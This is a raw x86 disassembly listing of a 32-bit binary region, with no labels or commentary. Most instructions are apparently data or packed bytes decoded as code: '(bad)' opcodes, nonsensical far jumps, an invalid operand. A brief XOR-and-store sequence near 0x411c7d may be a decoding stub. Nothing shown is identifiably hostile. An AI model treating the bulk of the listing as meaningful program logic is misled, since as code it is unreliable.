  41183d:	or     al,0x2b
  41183f:	ret    0x581
  411842:	jne    0x411841
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	cli    
  41184f:	std    
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fdf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x5576fe9],dl
  41187c:	leave  
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118ee
  411886:	inc    edx
  411887:	aad    0x69
  411889:	push   esi
  41188a:	ror    BYTE PTR [eax],1
  41188c:	shr    DWORD PTR [ecx-0x4a534dd0],cl
  411892:	adc    esi,DWORD PTR [edx-0x649bbd80]
  411898:	je     0x4118df
  41189a:	cwde   
  41189b:	icebp  
  41189c:	cwde   
  41189d:	ror    BYTE PTR [eax-0x647f456],0x13
  4118a4:	pop    esp
  4118a5:	mov    ds:0x6f5f5619,al
  4118aa:	mov    edx,0x833dcf12
  4118af:	icebp  
  4118b0:	cld    
  4118b1:	xchg   edi,eax
  4118b2:	inc    ebx
  4118b3:	sbb    DWORD PTR [eax+ecx*2+0x67],edi
  4118b7:	ret    
  4118b8:	dec    ecx
  4118b9:	xor    DWORD PTR [esi+0x5c],esp
  4118bc:	ret    
  4118bd:	push   0xc694ca30
  4118c2:	rol    DWORD PTR [esi+ecx*4],cl
  4118c5:	lods   al,BYTE PTR ds:[esi]
  4118c7:	cmc    
  4118c8:	ret    
  4118c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118ca:	push   cs
  4118cb:	dec    ebp
  4118cc:	adc    eax,0x162b9d6a
  4118d1:	icebp  
  4118d2:	shr    BYTE PTR [ebx-0x74714c8],1
  4118d8:	and    esp,edi
  4118da:	inc    eax
  4118db:	sub    al,0x96
  4118dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118de:	xor    eax,0x89e46f6d
  4118e3:	add    cl,bh
  4118e5:	aam    0xc
  4118e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118e8:	jbe    0x411898
  4118ea:	in     eax,dx
  4118eb:	ins    BYTE PTR es:[edi],dx
  4118ec:	jb     0x4118ba
  4118ee:	jno    0x41188b
  4118f0:	sbb    al,0x6d
  4118f2:	ins    DWORD PTR es:[edi],dx
  4118f3:	sbb    BYTE PTR [ebp+0x77],0xc1
  4118f7:	adc    bh,cl
  4118f9:	inc    ecx
  4118fa:	inc    esi
  4118fb:	out    0x69,al
  4118fd:	aaa    
  4118fe:	lods   eax,DWORD PTR ds:[esi]
  4118ff:	xchg   edx,eax
  411900:	fsub   QWORD PTR [esi]
  411902:	fs mov bh,0x51
  411905:	mov    esi,0x2a37e34d
  41190a:	mov    ecx,DWORD PTR [ecx]
  41190c:	jmp    0x9d6b732
  411911:	retf   0xbfe7
  411914:	push   edi
  411915:	inc    ebx
  411916:	pop    ss
  411917:	dec    ebx
  411918:	aam    0x94
  41191a:	push   ds
  41191b:	outs   dx,BYTE PTR ds:[esi]
  41191c:	fimul  WORD PTR [ebx+0x34]
  41191f:	jmp    0x4118cd
  411921:	jbe    0x41195d
  411923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411924:	cmc    
  411925:	adc    ah,BYTE PTR [edx+0x238fa4b]
  41192b:	mov    edx,0xb3252988
  411930:	retf   
  411931:	(bad)  
  411932:	cmp    cl,dh
  411934:	pop    ds
  411935:	add    ecx,DWORD PTR [ebp-0x73cb477a]
  41193b:	pop    eax
  41193c:	inc    ecx
  41193d:	cmp    cl,BYTE PTR [eax+0x78]
  411940:	daa    
  411941:	xor    al,0xd0
  411943:	addr16 iret 
  411945:	outs   dx,BYTE PTR ds:[esi]
  411946:	mov    edi,esi
  411948:	in     al,0x36
  41194a:	in     al,dx
  41194b:	ret    
  41194c:	hlt    
  41194d:	psrlw  mm3,QWORD PTR [ebp+0x2f]
  411951:	call   0xe9c3:0x52dad8fa
  411958:	adc    BYTE PTR [ebp+0x74],ch
  41195b:	mov    ecx,0xd01dba69
  411960:	mov    esp,fs
  411962:	fstp   DWORD PTR [ecx-0x21]
  411965:	lds    edi,FWORD PTR [eax-0x37]
  411968:	int3   
  411969:	popf   
  41196a:	test   eax,0x1b26b616
  41196f:	or     al,0xda
  411971:	mov    bh,0xd6
  411973:	mov    edi,0x7d7060f6
  411978:	adc    BYTE PTR [ebp-0x1],dl
  41197b:	jp     0x41194b
  41197d:	xchg   edx,eax
  41197e:	xchg   esp,eax
  41197f:	fadd   DWORD PTR ds:0xb7309e21
  411985:	loopne 0x41198d
  411987:	jecxz  0x4119b8
  411989:	test   DWORD PTR [ebp-0x21],esp
  41198c:	add    ch,BYTE PTR [ecx]
  41198e:	int    0x36
  411990:	dec    esp
  411991:	or     al,0xfe
  411993:	push   ecx
  411994:	xchg   cl,ch
  411996:	dec    esi
  411997:	add    DWORD PTR [eax+0x3464ea14],ebx
  41199d:	push   eax
  41199e:	sub    dl,BYTE PTR [ebx-0x80]
  4119a1:	ins    BYTE PTR es:[edi],dx
  4119a2:	mov    edx,0x2726878e
  4119a7:	imul   esi,DWORD PTR [ebx],0x4c
  4119aa:	enter  0x2309,0x73
  4119ae:	push   ds
  4119af:	sbb    bl,BYTE PTR [edi]
  4119b1:	js     0x411964
  4119b3:	mov    eax,ds:0x5581c539
  4119b8:	xor    eax,0xcba024e6
  4119bd:	pop    eax
  4119be:	test   eax,0x8a93e57e
  4119c3:	out    dx,eax
  4119c4:	sub    BYTE PTR [eax-0x50015159],dh
  4119ca:	stc    
  4119cb:	hlt    
  4119cc:	mov    edx,0x3d14d65e
  4119d1:	xchg   ebx,eax
  4119d2:	les    ebx,FWORD PTR [edx+0x22]
  4119d5:	and    cl,BYTE PTR [edi+eax*4-0x2c1c3221]
  4119dc:	or     al,0x28
  4119de:	out    0x13,al
  4119e0:	cs es pusha 
  4119e3:	out    0x35,al
  4119e5:	(bad)  
  4119e6:	mov    ah,0x17
  4119e8:	addr16 dec ebp
  4119ea:	das    
  4119eb:	pop    es
  4119ec:	mov    edx,DWORD PTR [ecx-0x7f9a65aa]
  4119f2:	fistp  WORD PTR [eax+0x69]
  4119f5:	fidiv  WORD PTR [ebp-0x52aff2c6]
  4119fb:	cmp    esi,eax
  4119fd:	xchg   edx,eax
  4119fe:	enter  0xa80c,0x64
  411a02:	jno    0x4119a7
  411a04:	in     eax,dx
  411a05:	in     eax,0xa7
  411a07:	sub    eax,0xa78c0d81
  411a0c:	xchg   ecx,eax
  411a0d:	adc    esi,ebx
  411a0f:	jnp    0x4119d5
  411a11:	enter  0xa81f,0x3c
  411a15:	mov    ebp,0x342b6d46
  411a1a:	shl    DWORD PTR [ecx],cl
  411a1c:	and    DWORD PTR [esi+0x79],eax
  411a1f:	mov    ebp,0x92e3258e
  411a24:	xchg   ebp,edi
  411a26:	jmp    0x4119e5
  411a28:	jbe    0x411a52
  411a2a:	in     al,dx
  411a2b:	ficomp DWORD PTR [esi-0x3b78e8ec]
  411a31:	mov    bh,0xc
  411a33:	mov    esi,0x3e37c406
  411a38:	jno    0x4119fb
  411a3a:	scas   eax,DWORD PTR es:[edi]
  411a3b:	adc    eax,0xbe9efadb
  411a40:	test   BYTE PTR [edx+ebx*1],al
  411a43:	jmp    0xbe78a6b7
  411a48:	js     0x4119e9
  411a4a:	mov    al,0xc4
  411a4c:	pop    esp
  411a4d:	and    eax,edi
  411a4f:	lock mov bh,0xd4
  411a52:	imul   ecx,DWORD PTR [ebx],0x70
  411a55:	jge    0x411a62
  411a57:	cmp    eax,0xc8a184d
  411a5c:	and    BYTE PTR [ecx+0x84eaa44],bl
  411a62:	test   al,0x3c
  411a64:	fld    QWORD PTR [edi-0x4332a182]
  411a6a:	adc    edi,eax
  411a6c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a6e:	pop    eax
  411a6f:	pop    ss
  411a70:	inc    esi
  411a71:	push   edx
  411a72:	jg     0x411aea
  411a74:	sbb    ecx,DWORD PTR [eax+0x2dbcc213]
  411a7a:	xchg   edx,eax
  411a7b:	pop    edi
  411a7c:	sub    BYTE PTR [esi+0x9b9db6c],ch
  411a82:	in     al,0x98
  411a84:	popf   
  411a85:	loopne 0x411a2c
  411a87:	test   BYTE PTR [edx-0x64ce68c],al
  411a8d:	and    DWORD PTR [esp+edx*1],esp
  411a90:	rcl    DWORD PTR [eax-0x47],cl
  411a93:	(bad)  
  411a94:	ficomp WORD PTR [edx]
  411a96:	push   esp
  411a97:	jae    0x411a6f
  411a99:	loope  0x411a6b
  411a9b:	addr16 or esp,edi
  411a9e:	sbb    al,ah
  411aa0:	js     0x411a84
  411aa2:	rcl    DWORD PTR [eax],1
  411aa4:	loope  0x411aed
  411aa6:	std    
  411aa7:	push   ds
  411aa8:	mov    ds:0x76680c12,al
  411aad:	ficomp WORD PTR [esi]
  411aaf:	gs and eax,0xffffffeb
  411ab3:	mov    ss,edx
  411ab5:	jmp    0x2c49:0xfe994403
  411abc:	out    dx,al
  411abd:	sbb    BYTE PTR [esi],ah
  411abf:	or     BYTE PTR ds:0xc5f6ef70,ah
  411ac5:	push   0xd942e955
  411aca:	fwait
  411acb:	out    dx,al
  411acc:	push   edi
  411acd:	sbb    DWORD PTR [eax+0x52],ebp
  411ad0:	xchg   ebp,eax
  411ad1:	sbb    DWORD PTR [eax-0x8],0x25
  411ad5:	sbb    eax,0x6c036ee5
  411ada:	int3   
  411adb:	push   0x7be969d1
  411ae0:	test   al,0x93
  411ae2:	xchg   BYTE PTR [ecx+esi*2-0x59d60728],ch
  411ae9:	popa   
  411aea:	fsub   st,st(4)
  411aec:	aas    
  411aed:	hlt    
  411aee:	xchg   ecx,eax
  411aef:	pop    ss
  411af0:	mov    bh,0x1b
  411af2:	xchg   ebp,eax
  411af3:	xchg   ecx,eax
  411af4:	dec    ebx
  411af5:	pushf  
  411af6:	(bad)  
  411af7:	jno    0x411b6d
  411af9:	sar    DWORD PTR [esi],1
  411afb:	test   edx,ebx
  411afd:	and    BYTE PTR es:[ecx],al
  411b00:	cli    
  411b01:	inc    esp
  411b02:	mul    DWORD PTR [ecx+0x2d]
  411b05:	sbb    al,0x22
  411b07:	pop    eax
  411b08:	mov    al,al
  411b0a:	rcr    DWORD PTR [ecx],0x4
  411b0d:	jo     0x411a9d
  411b0f:	shl    DWORD PTR [ecx],1
  411b11:	or     BYTE PTR [edx],dl
  411b13:	sbb    ch,BYTE PTR [eax+0x40]
  411b16:	lods   eax,DWORD PTR ds:[esi]
  411b17:	fcomp  QWORD PTR [edi+edi*1+0x72]
  411b1b:	push   esi
  411b1c:	xchg   BYTE PTR [edx+0x73],ch
  411b1f:	pop    edi
  411b20:	push   ss
  411b21:	mov    ebp,DWORD PTR [eax]
  411b23:	sub    dl,BYTE PTR [esi+eiz*8]
  411b26:	repnz rcl BYTE PTR [esi],1
  411b29:	xor    al,0x90
  411b2b:	and    ebx,esp
  411b2d:	sub    DWORD PTR [esi+0x70],ebx
  411b30:	das    
  411b31:	lods   al,BYTE PTR ds:[esi]
  411b32:	stos   DWORD PTR es:[edi],eax
  411b33:	or     al,0xde
  411b35:	inc    ecx
  411b36:	push   ss
  411b37:	les    esp,FWORD PTR [edx]
  411b39:	xor    DWORD PTR [ebx],0x2ea5aea5
  411b3f:	mov    eax,0xe4d2ffba
  411b44:	pop    esi
  411b45:	int3   
  411b46:	or     eax,0x22797eb5
  411b4b:	jnp    0x411b4f
  411b4d:	jae    0x411b57
  411b4f:	in     eax,dx
  411b50:	lods   eax,DWORD PTR ds:[esi]
  411b52:	pop    ds
  411b53:	pop    ebp
  411b54:	mov    ds:0x5d18870b,al
  411b59:	sbb    eax,0x1dfc6cbe
  411b5e:	add    al,al
  411b60:	aam    0xdf
  411b62:	push   edi
  411b63:	mov    ch,0x66
  411b65:	ret    
  411b66:	outs   dx,BYTE PTR ds:[esi]
  411b67:	jmp    0x6077:0x50a33395
  411b6e:	jge    0x411b19
  411b70:	pushf  
  411b71:	xor    al,0xf2
  411b73:	inc    ebx
  411b74:	or     cl,BYTE PTR [ecx+0x74c954ff]
  411b7a:	ror    BYTE PTR [edi],0x79
  411b7d:	in     eax,0x6e
  411b7f:	mov    edi,0x3b06be0a
  411b84:	xor    eax,0x558bf4ab
  411b89:	pop    esi
  411b8a:	sbb    edi,DWORD PTR gs:[ecx]
  411b8d:	fisttp WORD PTR [edi-0xa95579b]
  411b93:	stos   DWORD PTR es:[edi],eax
  411b94:	inc    edx
  411b95:	aam    0xec
  411b97:	cmp    DWORD PTR [ebp+0x46b0d115],esi
  411b9d:	cli    
  411b9e:	sub    DWORD PTR [edx-0x6f477823],0x3d7cf9a0
  411ba8:	adc    BYTE PTR [ecx-0x62],0xab
  411bac:	out    dx,eax
  411bad:	stos   DWORD PTR es:[edi],eax
  411bae:	pop    ebp
  411baf:	push   ecx
  411bb0:	cmp    al,BYTE PTR [ebx-0x1c]
  411bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bb4:	iret   
  411bb5:	sub    ah,al
  411bb7:	cmp    eax,0xa3d773c2
  411bbc:	dec    edi
  411bbd:	inc    edx
  411bbe:	jb     0x411b7c
  411bc0:	and    al,0x22
  411bc2:	pop    edi
  411bc3:	(bad)  
  411bc4:	or     BYTE PTR [esi-0x44d5ef25],cl
  411bca:	mov    esi,0x2451d069
  411bcf:	xor    BYTE PTR [ecx-0x12],0x1b
  411bd3:	into   
  411bd4:	jne    0x411c4c
  411bd6:	xor    ch,bh
  411bd8:	add    BYTE PTR [ecx+0x586c4e63],al
  411bde:	repz dec ebx
  411be0:	mov    edi,ecx
  411be2:	(bad)  
  411be3:	outs   dx,DWORD PTR ds:[esi]
  411be4:	dec    ebx
  411be5:	in     eax,dx
  411be6:	push   ebx
  411be7:	push   ebx
  411be8:	dec    esp
  411be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bea:	xor    esp,esi
  411bec:	mov    esp,gs
  411bee:	mov    eax,0x25d47d56
  411bf3:	nop
  411bf4:	mov    esi,0x4961a80a
  411bf9:	mov    bh,0x92
  411bfb:	pop    ecx
  411bfc:	pop    eax
  411bfd:	dec    ebp
  411bfe:	push   ecx
  411bff:	retf   0x6934
  411c02:	or     DWORD PTR [esi],esp
  411c04:	push   cs
  411c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c06:	ret    
  411c07:	imul   BYTE PTR [edx-0xadc774a]
  411c0d:	ins    DWORD PTR es:[edi],dx
  411c0e:	(bad)  
  411c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c10:	push   0x8cd7805d
  411c15:	mov    esp,0x6004a95b
  411c1a:	push   0xb9f3e01a
  411c1f:	cmp    eax,0xf8513c0e
  411c24:	mov    ?,WORD PTR [ebp-0xc]
  411c27:	mov    eax,ds:0xc8cbc088
  411c2c:	gs jle 0x411c19
  411c2f:	adc    esi,DWORD PTR [eax+0x1e54e4cb]
  411c35:	or     dl,BYTE PTR [edx]
  411c37:	(bad)  
  411c38:	lds    ebp,FWORD PTR [esi-0x59390e79]
  411c3e:	push   edx
  411c3f:	adc    DWORD PTR [eax-0x4c65d995],edi
  411c45:	(bad)  
  411c46:	pslld  mm2,mm1
  411c49:	cwde   
  411c4a:	lods   eax,DWORD PTR ds:[esi]
  411c4b:	jl     0x411c2b
  411c4d:	shr    BYTE PTR [ebx],1
  411c4f:	or     BYTE PTR [esi-0x2372cf2c],bl
  411c55:	pushf  
  411c56:	mov    cl,0xb3
  411c58:	aad    0x5
  411c5a:	dec    ecx
  411c5b:	and    esp,DWORD PTR [edx]
  411c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c5e:	xchg   ecx,edx
  411c60:	dec    eax
  411c61:	cld    
  411c62:	push   eax
  411c63:	rcl    BYTE PTR [edx-0x2afbeda0],1
  411c69:	dec    edi
  411c6a:	inc    edi
  411c6b:	push   edx
  411c6c:	mov    edi,0x41b22ca1
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x1f2cea5e
  411cb8:	or     al,0x5e
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c8d
  411cc2:	data16 (bad) 
  411cc4:	pop    ebp
  411cc5:	(bad)  
  411cc6:	push   0x86b6dacb
  411ccb:	stos   BYTE PTR es:[edi],al
  411ccc:	in     eax,0x7f
  411cce:	or     edx,DWORD PTR [eax-0x55fdbfa7]
  411cd4:	xchg   BYTE PTR [esi+ebp*8-0x2310db77],bl
  411cdb:	pop    esp
  411cdc:	inc    esi
  411cdd:	cmp    DWORD PTR [eax-0x18],ecx
  411ce0:	mov    bh,0xb1
  411ce2:	inc    edi
  411ce3:	xchg   edi,eax
  411ce4:	int    0x64
  411ce6:	sub    edx,esi
  411ce8:	xchg   ecx,eax
  411ce9:	inc    edi
  411cea:	add    BYTE PTR [ebx],ch
  411cec:	cli    
  411ced:	sub    eax,0x8e18dd78
  411cf2:	test   al,0xbf
  411cf4:	sbb    esi,esp
  411cf6:	xor    BYTE PTR [ebp-0x3e],bl
  411cf9:	(bad)  
  411cfb:	pop    ecx
  411cfc:	(bad)  
  411cfd:	aad    0xe0
  411cff:	mov    ds:0xab93d108,al
  411d04:	sti    
  411d05:	lahf   
  411d06:	jp     0x411d7c
  411d08:	and    bl,dl
  411d0a:	aas    
  411d0b:	dec    esp
  411d0c:	push   ds
  411d0d:	jmp    0xc843:0xc0272d29
  411d14:	mov    cl,0xa2
  411d16:	sets   BYTE PTR [esp+eax*1-0x19]
  411d1b:	mov    ds:0xc6bd0a63,eax
  411d20:	cmp    eax,0x91aef655
  411d25:	xlat   BYTE PTR ds:[ebx]
  411d26:	mov    WORD PTR [ebp+0x2f58e835],fs
  411d2c:	pop    ds
  411d2d:	cdq    
  411d2e:	popa   
  411d2f:	inc    edi
  411d30:	pop    edx
  411d31:	in     al,0x7
  411d33:	pop    ss
  411d34:	jmp    0xc01f:0x4df6a571
  411d3b:	imul   ebp,DWORD PTR [eax+0x5c1bfa38],0x7f
  411d42:	das    
  411d43:	jmp    DWORD PTR [edi]
  411d45:	scas   al,BYTE PTR es:[edi]
  411d46:	je     0x411d63
  411d48:	or     al,0xb4
  411d4a:	ret    
  411d4b:	pop    esp
  411d4c:	xor    ch,BYTE PTR [ebx+ebp*1-0x2a]
  411d50:	pop    esp
  411d51:	mov    esp,DWORD PTR [ebx+0x1b]
  411d54:	sub    bl,BYTE PTR [ecx]
  411d56:	arpl   WORD PTR [esi-0x325f931c],sp
  411d5c:	xchg   edx,eax
  411d5d:	xor    ebx,esi
  411d5f:	js     0x411d88
  411d61:	fisubr DWORD PTR [ebx]
  411d63:	sbb    ch,BYTE PTR [edx-0x56b644de]
  411d69:	add    eax,0xff49124d
  411d6e:	out    dx,al
  411d6f:	jno    0x411da1
  411d71:	in     eax,dx
  411d72:	loope  0x411d2a
  411d74:	or     eax,DWORD PTR [ebp+0x6da2b72d]
  411d7a:	aam    0x31
  411d7c:	in     al,0x8b
  411d7e:	pop    edx
  411d7f:	dec    ecx
  411d80:	stc    
  411d81:	or     al,0x11
  411d83:	pop    esp
  411d84:	pop    edi
  411d85:	pop    ebx
  411d86:	push   0x94395a3b
  411d8b:	ins    DWORD PTR es:[edi],dx
  411d8c:	mov    dl,0x68
  411d8e:	(bad)  
  411d90:	dec    edi
  411d91:	lods   eax,DWORD PTR ds:[esi]
  411d92:	popf   
  411d93:	lds    ebx,FWORD PTR [edi-0x693ba704]
  411d99:	sbb    BYTE PTR [edx+0x51],bh
  411d9c:	retf   
  411d9d:	dec    eax
  411d9e:	inc    ecx
  411d9f:	or     eax,0xea524066
  411da4:	ret    
  411da5:	sub    BYTE PTR [esi+0x15],dh
  411da8:	je     0x589b451d
  411dae:	dec    DWORD PTR [ebx]
  411db0:	inc    esp
  411db1:	(bad)  
  411db2:	fsubr  QWORD PTR [eax]
  411db4:	add    cl,BYTE PTR [eax-0x68]
  411db7:	cld    
  411db8:	xor    al,0x86
  411dba:	mov    eax,0x2126c766
  411dbf:	pop    edx
  411dc0:	inc    esp
  411dc1:	test   eax,0x3773a77c
  411dc6:	push   esp
  411dc7:	pop    ebp
  411dc8:	fldcw  WORD PTR [edx-0x3c]
  411dcb:	aad    0x89
  411dcd:	stos   DWORD PTR es:[edi],eax
  411dce:	and    DWORD PTR [edi],0xfc07d119
  411dd4:	cmp    DWORD PTR [ebp+0x1e],ebx
  411dd7:	fistp  WORD PTR [edi]
  411dd9:	lods   eax,DWORD PTR ds:[esi]
  411dda:	(bad)  
  411ddb:	xor    DWORD PTR [ebp-0x44],ecx
  411dde:	popf   
  411ddf:	cmp    esp,DWORD PTR ds:0x84cf2dc1
  411de5:	out    0x56,al
  411de7:	jmp    0x411d87
  411de9:	xchg   DWORD PTR [eax+0x5a6fe745],edx
  411def:	inc    eax
  411df0:	dec    ebp
  411df1:	dec    esp
  411df2:	sahf   
  411df3:	or     edi,DWORD PTR [esi+0x58]
  411df6:	xor    BYTE PTR [eax+eax*8],ch
  411df9:	and    edx,DWORD PTR [edi-0x3]
  411dfc:	jns    0x411e40
  411dfe:	mov    dl,bl
  411e00:	pushf  
  411e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e02:	inc    ebx
  411e03:	pop    ds
  411e04:	or     al,0xd2
  411e06:	fcomp  DWORD PTR [ebp-0xc4d01]
  411e0c:	cmp    ebx,esi
  411e0e:	imul   DWORD PTR [edx+esi*1]
  411e11:	push   ebx
  411e12:	rcl    DWORD PTR [edi-0x365d21b5],1
  411e18:	loope  0x411e67
  411e1a:	or     cl,BYTE PTR ds:0x1ecb4473
  411e20:	imul   ecx,DWORD PTR [esi-0x6c],0x9d979877
  411e27:	add    edi,DWORD PTR [ecx]
  411e29:	dec    ebx
  411e2a:	sbb    esp,DWORD PTR ds:0x21a61af9
  411e30:	jbe    0x411e6f
  411e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e33:	in     eax,0x3b
  411e35:	rcr    DWORD PTR [ebx+esi*1+0x62],1
  411e39:	inc    DWORD PTR [esi]
  411e3b:	xor    BYTE PTR [ebx+edi*4],bl
  411e3e:	int3   
  411e3f:	shr    BYTE PTR [ecx+0xc],cl
  411e42:	fsub   DWORD PTR [ecx]
  411e44:	shl    BYTE PTR ds:0x6af54d60,cl
  411e4a:	mov    dl,0x9d
  411e4c:	mov    ah,0xb6
  411e4e:	pop    eax
  411e4f:	ja     0x411e2e
  411e51:	dec    eax
  411e52:	mov    cl,0xc4
  411e54:	push   edx
  411e55:	cs push ecx
  411e57:	sahf   
  411e58:	mov    ss,WORD PTR [ebx]
  411e5a:	sti    
  411e5b:	xchg   esi,eax
  411e5c:	(bad)  
  411e5d:	jle    0x411e79
  411e5f:	push   edx
  411e60:	js     0x411eb6
  411e62:	pop    ds
  411e63:	mov    eax,0xee1eb13f
  411e68:	pop    ebx
  411e69:	jmp    0x411e29
  411e6b:	adc    BYTE PTR [ecx-0xa],al
  411e6e:	sbb    BYTE PTR [edx],bl
  411e70:	rol    BYTE PTR [ecx-0x66fba447],1
  411e76:	cwde   
  411e77:	add    BYTE PTR [ebp-0xa],0xe4
  411e7b:	sub    DWORD PTR [edi+0x2785145d],ebx
  411e81:	pop    ebp
  411e82:	push   ss
  411e83:	aad    0x7d
  411e85:	shl    BYTE PTR [eax],cl
  411e87:	in     al,0xf5
  411e89:	cmp    DWORD PTR [eax+0x4d7c694],esi
  411e8f:	inc    esi
  411e90:	add    BYTE PTR [ebx+0x42897025],ah
  411e96:	push   cs
  411e97:	mov    edx,ebx
  411e99:	jmp    0x411e9c
  411e9b:	hlt    
  411e9c:	sbb    ch,BYTE PTR [edx+0x18]
  411e9f:	add    eax,0xebf1b27c
  411ea4:	aaa    
  411ea5:	in     eax,dx
  411ea6:	sub    ebp,DWORD PTR [ecx-0x68]
  411ea9:	mov    dh,0xf7
  411eab:	push   0x44
  411ead:	mov    sp,0xc340
  411eb1:	stos   BYTE PTR es:[edi],al
  411eb2:	gs in  al,dx
  411eb4:	(bad)  
  411eb6:	inc    eax
  411eb7:	repz mov bh,0x8b
  411ebb:	leave  
  411ebc:	xchg   edi,eax
  411ebd:	mov    al,ds:0xd443960e
  411ec2:	fstp   DWORD PTR [ecx-0x2cabd642]
  411ec8:	xchg   edx,eax
  411ec9:	add    ecx,esp
  411ecb:	xchg   edi,eax
  411ecc:	adc    al,0xfb
  411ece:	xchg   BYTE PTR [ebx+0x4dc51418],dh
  411ed4:	pop    edx
  411ed5:	sbb    BYTE PTR [esp+ecx*1-0x5d],cl
  411ed9:	sti    
  411eda:	mov    eax,ds:0x89cf44d5
  411edf:	adc    eax,0x4fc1a05c
  411ee4:	pop    ss
  411ee5:	xchg   ebp,eax
  411ee6:	jno    0x411e7f
  411ee8:	pop    edi
  411ee9:	adc    ch,BYTE PTR [esi-0x25e583d4]
  411eef:	(bad)  
  411ef0:	mov    esi,ecx
  411ef2:	mov    es,WORD PTR [ebx-0x388cae0f]
  411ef8:	gs dec esp
  411efa:	adc    DWORD PTR [edi+ebp*4-0x270eed],edx
  411f01:	inc    edx
  411f02:	clc    
  411f03:	push   esi
  411f04:	push   0x1
  411f06:	(bad)  
  411f08:	and    ecx,esp
  411f0a:	not    dl
  411f0c:	mov    edx,0x6699ad4a
  411f11:	in     al,dx
  411f12:	fwait
  411f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f14:	psrld  mm3,mm2
  411f17:	xchg   DWORD PTR [edx+eax*1+0x7667f18d],edx
  411f1e:	repnz or eax,0x4188ec91
  411f24:	std    
  411f25:	stc    
  411f26:	add    eax,0x48c9c9e1
  411f2b:	cmp    ecx,DWORD PTR [edi-0x52]
  411f2e:	mov    DWORD PTR [edx],edx
  411f30:	gs stos BYTE PTR es:[edi],al
  411f32:	add    eax,0x6325e6c5
  411f37:	add    ah,ch
  411f39:	adc    bl,dl
  411f3b:	sub    al,BYTE PTR [edx+ebp*8]
  411f3e:	cmp    BYTE PTR [ebp-0x2f776c1a],dl
  411f44:	add    dh,ch
  411f46:	mov    dl,0x3
  411f48:	or     al,0xdd
  411f4a:	mov    edx,DWORD PTR [ebx+0x48]
  411f4d:	sbb    eax,0x95ba7c40
  411f52:	addr16 push 0x75
  411f55:	shr    DWORD PTR [ebx-0x379916d8],1
  411f5b:	add    DWORD PTR [eax+0x759a113],0x7
  411f62:	sbb    al,0x88
  411f64:	stos   BYTE PTR es:[edi],al
  411f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f66:	sub    edi,esi
  411f68:	test   esp,ebx
  411f6a:	jp     0x411f30
  411f6c:	fimul  DWORD PTR [eax+0x71c93635]
  411f72:	call   0xc604:0x861be476
  411f79:	and    DWORD PTR [ecx],ecx
  411f7b:	lds    eax,FWORD PTR [ecx-0x3ef7a7d0]
  411f81:	xor    al,0x2f
  411f83:	push   ss
  411f84:	inc    ecx
  411f85:	or     DWORD PTR [ebp+0x1025d2e4],ecx
  411f8b:	fnstsw WORD PTR [ebx-0x30]
  411f8e:	dec    eax
  411f8f:	das    
  411f90:	jecxz  0x41200b
  411f92:	xchg   DWORD PTR [edi+edx*2+0x9],esi
  411f96:	jp     0x411fae
  411f98:	pop    ebp
  411f99:	cld    
  411f9a:	mov    esi,0xde7b6dfd
  411f9f:	aad    0x1a
  411fa1:	add    al,0x41
  411fa3:	ret    0x8b18
  411fa6:	sbb    BYTE PTR [ecx-0x6b7cadcc],ch
  411fac:	jmp    FWORD PTR [ebx+0x42c06911]
  411fb2:	(bad)  
  411fb3:	ins    DWORD PTR es:[edi],dx
  411fb4:	mov    eax,ds:0x7f4591d4
  411fb9:	mov    edi,0xa2605687
  411fbe:	adc    BYTE PTR [edx+eiz*2+0x44],al
  411fc2:	(bad)  
  411fc4:	xchg   edx,eax
  411fc5:	push   ebp
  411fc6:	nop
  411fc7:	jno    0x411f4f
  411fc9:	or     eax,0xf6bdb58f
  411fce:	fidiv  WORD PTR [esi-0x72d5bcbf]
  411fd4:	mov    ah,0x73
  411fd6:	or     dl,BYTE PTR [edi]
  411fd8:	(bad)  
  411fd9:	jnp    0x412031
  411fdb:	xor    ebx,DWORD PTR [edi]
  411fdd:	adc    DWORD PTR [ebx-0x4b],0xffffffc1
  411fe1:	imul   ebx,DWORD PTR [edi+edx*2],0x277e13bd
